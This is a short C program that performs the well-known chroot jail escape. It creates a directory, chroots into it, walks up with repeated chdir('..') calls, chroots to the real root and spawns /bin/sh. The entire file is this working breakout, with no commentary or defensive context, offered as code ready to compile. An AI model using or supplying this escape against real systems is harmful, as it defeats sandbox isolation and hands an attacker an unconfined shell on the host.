#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
int main(void) {
	int i;
	mkdir ("breakout", 0700);
	chroot("breakout");
	for (i=0;i<100;i++)
		chdir("..");
	chroot(".");
	execl("/bin/sh", "/bin/sh", NULL);
}

